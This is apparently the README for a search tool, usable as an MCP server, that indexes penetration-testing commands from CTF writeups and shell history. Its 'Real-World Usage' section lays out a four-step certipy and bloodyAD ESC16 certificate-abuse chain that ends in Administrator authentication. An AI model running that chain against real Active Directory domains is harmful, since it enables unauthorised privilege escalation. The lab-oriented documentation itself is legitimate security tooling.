# Command Vault (also MCP)

> *"What was that certipy command I used last week for ESC8?"*
> *"How did I exploit that shadow credentials thing again?"*

Ever found yourself digging through shell history, old notes, or writeups trying to recall that exact command you used before? Shell history is basic and lacks context. This tool solves that.

Command Vault indexes commands from your penetration testing notes, reports, and shell history into a searchable database with full context - what tool, what technique, which box. It's MCP-ready, so your AI assistant can search both your documented commands and actual shell history for you.

## Features

- **Full-text search** across commands and scripts from your writeups
- **Shell history indexing** - Index `~/.zsh_history` or `~/.bash_history` with deduplication
- **Smart categorization** - 200+ security tools mapped to categories (recon, AD, web, privesc, etc.)
- **Template generation** - Auto-replaces IPs, domains, passwords with placeholders
- **Security filtering** - Credentials, API keys, and sensitive data automatically redacted
- **Multiple writeup types** - Supports boxes, challenges, and Sherlocks
- **Database maintenance** - Built-in VACUUM, ANALYZE, and FTS optimization

## Requirements

- Python 3.11+
- [uv](https://docs.astral.sh/uv/) (recommended) or pip

## Installation

```bash
# Clone the repository
git clone https://github.com/x746b/command-vault.git
cd command-vault

# Install with uv (recommended)
uv pip install -e .

# Or with pip
pip install -e .
```

## Quick Start

1. **Set up your writeup directories** (environment variables or defaults):

```bash
export WRITEUPS_BOXES="$HOME/writeups/boxes"
export WRITEUPS_CHALLENGES="$HOME/writeups/challenges"
export WRITEUPS_SHERLOCKS="$HOME/writeups/sherlocks"
```

2. **Index your writeups**:

```bash
vault index --rebuild
```

3. **Search for commands**:

```bash
vault search "kerberoasting"
vault search --tool nmap --category recon
```

## Indexing Writeups

### Initial Index

Run a full index on first setup:

```bash
vault index --rebuild
```

### Adding New Writeups

After adding new writeup files:

```bash
vault index --add
```

### Index Specific Type

```bash
vault index --add --type box        # Only boxes
vault index --add --type challenge  # Only challenges
vault index --add --type sherlock   # Only sherlocks
```

### Index Custom Directories

```bash
vault index --add /path/to/writeups /another/path
```

## CLI Usage

```bash
# Search by keyword
vault search "kerberoasting"
vault search "shadow credentials"

# Search by tool
vault search --tool certipy
vault search --tool bloodyAD --limit 5

# Search by category
vault search --category ad
vault search --category privesc

# Filter by writeup type
vault search --type box "ADCS"
vault search --type challenge "SQLi"

# Combine filters
vault search --tool nmap --category recon --limit 10

# Search scripts
vault scripts --language python
vault scripts --library pwn

# List tools and categories
vault tools --category ad
vault categories

# Show statistics
vault stats

# JSON output (for scripting)
vault search "ESC16" --json

# Database maintenance
vault maintain --all       # Run all maintenance tasks
vault maintain --vacuum    # Reclaim disk space
vault maintain --analyze   # Update query statistics
vault maintain --optimize  # Optimize FTS indexes
```

## Shell History Indexing

Index your shell history to search commands you've actually used (not just from writeups).

### Index History

```bash
# Index zsh history (always adds, never rebuilds - safe to run multiple times)
vault history index ~/.zsh_history

# Index bash history
vault history index ~/.bash_history

# Index only commands after a specific date
vault history index ~/.zsh_history --since "2024-01-01"
```

### Search History

```bash
# Free-text search
vault history search "kerberoast"
vault history search "nmap"

# Filter by tool
vault history search --tool certipy
vault history search --tool bloodhound --limit 20

# Combine query and tool filter
vault history search "ADCS" --tool certipy
```

### History Statistics

```bash
vault history stats
```

Output:
```json
{
  "total_commands": 24589,
  "unique_tools": 1749,
  "top_tools": [
    {"tool": "nxc", "count": 1378},
    {"tool": "curl", "count": 1295},
    {"tool": "nmap", "count": 668}
  ]
}
```

### Clear History

```bash
# Clear all (requires --confirm flag for safety)
vault history clear --confirm

# Clear commands from specific file
vault history clear --source ~/.zsh_history --confirm

# Clear commands before a date
vault history clear --before "2023-01-01" --confirm
```

### Example Output

```
$ vault search "ESC16"

============================================================
Tool: certipy
Source: BoxName.md [PrivESC]
Purpose: Certipy v5.0.2 shows "ESC16 : Security Extension is disabled"...

  certipy find -u 'svc_user' -hashes ':a1b2c3...' -dc-ip 10.10.10.100 -stdout -vulnerable

  Template: certipy find -u 'svc_user' -hashes ':a1b2c3...' -dc-ip {IP} -stdout -vulnerable
```

```
$ vault stats

{
  "writeups": {
    "total": 150,
    "boxes": 80,
    "challenges": 50,
    "sherlocks": 20
  },
  "commands": {
    "total": 2500,
    "by_category": {
      "recon": 400,
      "ad": 350,
      "web": 300,
      ...
    }
  }
}
```

### Shell Alias

Add to your `~/.bashrc` or `~/.zshrc`:

```bash
alias vault="cd /opt/command-vault-mcp && uv run vault"
```

Then use directly:
```bash
vault search "certipy"
vault stats
```

## MCP Server Configuration

### CLI (Claude Code, Codex, Gemini)

```bash
claude mcp add command-vault --scope user \
  -e VAULT_DB=~/.local/share/command-vault/vault.db \
  -e WRITEUPS_BOXES=~/writeups/boxes \
  -e WRITEUPS_CHALLENGES=~/writeups/challenges \
  -e WRITEUPS_SHERLOCKS=~/writeups/sherlocks \
  -- /path/to/command-vault/.venv/bin/python -m command_vault.server
```

Replace `claude` with `codex` or `gemini` for other AI coding assistants.

### JSON Config

Add to `~/.claude.json` or `.mcp.json`:

```json
{
  "mcpServers": {
    "command-vault": {
      "command": "/path/to/command-vault/.venv/bin/python",
      "args": ["-m", "command_vault.server"],
      "env": {
        "VAULT_DB": "~/.local/share/command-vault/vault.db",
        "WRITEUPS_BOXES": "~/writeups/boxes",
        "WRITEUPS_CHALLENGES": "~/writeups/challenges",
        "WRITEUPS_SHERLOCKS": "~/writeups/sherlocks"
      }
    }
  }
}
```

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `VAULT_DB` | Path to SQLite database | `~/.local/share/command-vault/vault.db` |
| `WRITEUPS_BOXES` | Boxes writeups directory | None |
| `WRITEUPS_CHALLENGES` | Challenges writeups directory | None |
| `WRITEUPS_SHERLOCKS` | Sherlocks writeups directory | None |

## MCP Tools Reference

### Writeup Tools

| Tool | Description |
|------|-------------|
| `search_commands` | Search commands by keyword, tool, or category |
| `search_scripts` | Search exploit scripts (Python, JS/Frida, PowerShell) |
| `get_tool_examples` | Get usage examples for a specific tool |
| `suggest_command` | Get command suggestions for a goal |
| `list_tools` | List indexed tools |
| `list_categories` | List categories with counts |
| `get_writeup_summary` | Get summary from a specific writeup |
| `index_writeups` | Index or re-index writeup directories |
| `vault_stats` | Get statistics about indexed content |

### History Tools

| Tool | Description |
|------|-------------|
| `index_history` | Index shell history file (always adds, idempotent) |
| `search_history` | Search indexed shell history commands |
| `history_stats` | Get statistics about indexed history |
| `clear_history` | Clear indexed history (requires `confirm=true`)

## Writeup Format

The parser expects markdown files with fenced code blocks. Commands are extracted based on shell prompts.

### Supported Prompts

| Prompt Style | Example | Extracted Command |
|--------------|---------|-------------------|
| Bash `$` | `$ nmap -sV 10.10.11.1` | `nmap -sV 10.10.11.1` |
| Zsh `➜` | `➜  hackthebox nmap -sV 10.10.11.1` | `nmap -sV 10.10.11.1` |
| Zsh + git | `➜  repo git:(main) python3 exploit.py` | `python3 exploit.py` |
| Virtualenv | `(venv) ➜  project python3 solve.py` | `python3 solve.py` |
| PowerShell | `PS C:\Users> Get-ADUser -Filter *` | `Get-ADUser -Filter *` |
| Evil-WinRM | `*Evil-WinRM* PS C:\> whoami` | `whoami` |
| PowerView | `PV > Get-DomainUser` | `Get-DomainUser` |
| CMD | `C:\Windows> whoami` | `whoami` |

### Example Writeup

~~~markdown
## Enumeration

```bash
$ nmap -sC -sV 10.10.11.100
```

```bash
➜  boxname nmap -p- --min-rate 10000 10.10.11.100
```

```powershell
*Evil-WinRM* PS C:\Users\admin> Get-ADUser -Filter *
```

```python
#!/usr/bin/env python3
from pwn import *
# exploit code - detected as script
```
~~~

### Output Filtering

The parser automatically skips common output patterns that aren't commands:
- Tool banners: `Impacket v`, `Certipy v`, `[*]`, `[+]`, `[-]`
- ACL output: `Owner:`, `Group:`, `Allow`, `Deny`
- Timestamps, separator lines (`---`, `===`)

### Writeup Types

- **Boxes**: Machine writeups (detected from `/boxes/` in path)
- **Challenges**: CTF challenges with type in filename, e.g., `Challenge (web).md`
- **Sherlocks**: DFIR investigations (detected from `/sherlocks/` in path)

## Example: Real-World Usage

> **You:** *"What was that certipy command I used for ESC16?"*

Command Vault searches your writeups and returns the full attack chain with context:

**1. Find vulnerable templates:**
```bash
certipy find -u 'user' -hashes ':hash' -dc-ip $IP -stdout -vulnerable
# Output: "ESC16 : Security Extension is disabled"
```

**2. Change target UPN to Administrator:**
```bash
bloodyAD --host dc.domain.local -d domain.local -u controlleduser \
  -p ':hash' set object targetuser userPrincipalName -v Administrator
```

**3. Request certificate with Administrator SID:**
```bash
certipy req -u 'targetuser@domain.local' -hashes ':hash' \
  -ca 'YOURCA' -template 'User' \
  -upn 'administrator@domain.local' -sid 'S-1-5-21-...-500'
```

**4. Authenticate with the certificate:**
```bash
certipy auth -pfx administrator.pfx -domain domain.local
```

All commands come with source context (which box, which section) so you can revisit the full writeup if needed.

## Data Processing Pipelines

Command Vault uses different processing pipelines for writeups and shell history to extract, sanitize, and index commands.

### Writeup Processing Pipeline

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  Markdown File  │────▶│  Code Block      │────▶│  Command        │
│  (.md)          │     │  Extraction      │     │  Detection      │
└─────────────────┘     └──────────────────┘     └─────────────────┘
                                                          │
                        ┌──────────────────┐              ▼
                        │  Database        │◀────┌─────────────────┐
                        │  + FTS Index     │     │  Tool ID &      │
                        └──────────────────┘     │  Categorization │
                                 ▲               └─────────────────┘
                                 │                        │
                        ┌──────────────────┐              ▼
                        │  Template        │◀────┌─────────────────┐
                        │  Generation      │     │  Security       │
                        └──────────────────┘     │  Filtering      │
                                                 └─────────────────┘
```

**Stages:**

1. **Code Block Extraction** - Parse markdown for fenced code blocks (`bash`, `powershell`, `python`)
2. **Command Detection** - Identify shell prompts (`$`, `➜`, `PS>`, `*Evil-WinRM*`) and extract commands
3. **Security Filtering** - Redact credentials, API keys, tokens using pattern matching
4. **Tool Identification** - Map first token to known tools (200+ security tools)
5. **Categorization** - Assign category (recon, AD, web, privesc, etc.)
6. **Template Generation** - Replace IPs, domains, usernames with `{IP}`, `{DOMAIN}`, `{USER}` placeholders
7. **FTS Indexing** - Store in SQLite with full-text search on command text and purpose

### Shell History Processing Pipeline

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  History File   │────▶│  Format          │────▶│  Blocklist      │
│  (.zsh_history) │     │  Detection       │     │  Filtering      │
└─────────────────┘     └──────────────────┘     └─────────────────┘
                                                          │
                        ┌──────────────────┐              ▼
                        │  Database        │◀────┌─────────────────┐
                        │  + FTS Index     │     │  Deduplication  │
                        └──────────────────┘     │  (SHA256 hash)  │
                                 ▲               └─────────────────┘
                                 │                        │
                        ┌──────────────────┐              ▼
                        │  Tool ID &       │◀────┌─────────────────┐
                        │  Templatization  │     │  Security       │
                        └──────────────────┘     │  Sanitization   │
                                                 └─────────────────┘
```

**Stages:**

1. **Format Detection** - Auto-detect zsh extended (`: timestamp:0;cmd`) or bash format
2. **Blocklist Filtering** - Skip ~80 common non-security commands:
   - Navigation: `cd`, `ls`, `pwd`, `clear`
   - Editors: `vim`, `nano`, `code`
   - Package managers: `apt`, `brew`, `pip`
   - Git basics: `git status`, `git add`, `git commit`
3. **Allowlist Override** - Always index security tools even if short:
   - `nmap`, `ffuf`, `sqlmap`, `certipy`, `bloodhound-python`, etc.
4. **Security Sanitization** - Redact sensitive patterns:
   - Passwords: `-p 'secret'` → `-p {REDACTED}`
   - API keys: `--api-key ABC123` → `--api-key {REDACTED}`
   - Connection strings, tokens, hashes
5. **Deduplication** - SHA256 hash of normalized command; duplicates increment `occurrence_count`
6. **Tool Identification** - Map to known tools for filtering
7. **Templatization** - Replace IPs, domains with placeholders
8. **FTS Indexing** - Full-text search on sanitized command text

### Security Patterns (Redacted)

| Pattern Type | Examples |
|--------------|----------|
| Passwords | `-p 'pass'`, `--password=`, `-passwd` |
| API Keys | `--api-key`, `-k`, `--token` |
| Hashes | `-H 'aad3b435...'`, `--hashes` |
| Connection Strings | `mysql://user:pass@host` |
| Private Keys | `-----BEGIN.*KEY-----` |
| AWS/Cloud | `AKIA...`, `aws_secret` |

### Templatization Patterns

| Original | Template |
|----------|----------|
| `10.10.11.100` | `{IP}` |
| `192.168.1.50` | `{IP}` |
| `domain.htb` | `{DOMAIN}` |
| `dc.corp.local` | `{DOMAIN}` |
| `/home/user/...` | `/home/{USER}/...` |

## Troubleshooting

### "vault: command not found"

The CLI isn't in your PATH. Use one of these approaches:

```bash
# Option 1: Run via uv
cd /path/to/command-vault-mcp
uv run vault search "query"

# Option 2: Add to PATH after install
pip install -e .  # Creates vault in ~/.local/bin
export PATH="$HOME/.local/bin:$PATH"
```

### "No results found"

1. Check if writeups are indexed: `vault stats`
2. If counts are 0, run: `vault index --rebuild`
3. Verify writeup directories exist and contain `.md` files

### MCP server not connecting

1. Verify the `cwd` path in your MCP config points to the project directory
2. Check that `uv` is installed and in PATH
3. Test manually: `cd /path/to/command-vault-mcp && uv run command-vault`

### Database errors

Run maintenance first:

```bash
vault maintain --all
```

If issues persist, reset the database:

```bash
rm ~/.local/share/command-vault/vault.db
vault index --rebuild
vault history index ~/.zsh_history  # Re-index history if needed
```

### Commands not being extracted

The parser looks for code blocks with `bash`, `sh`, `powershell`, or `ps` language tags. Commands should start with `$`, `#`, or `PS>` prompts, or be standalone tool invocations.

## License

MIT License - see [LICENSE](LICENSE) file.
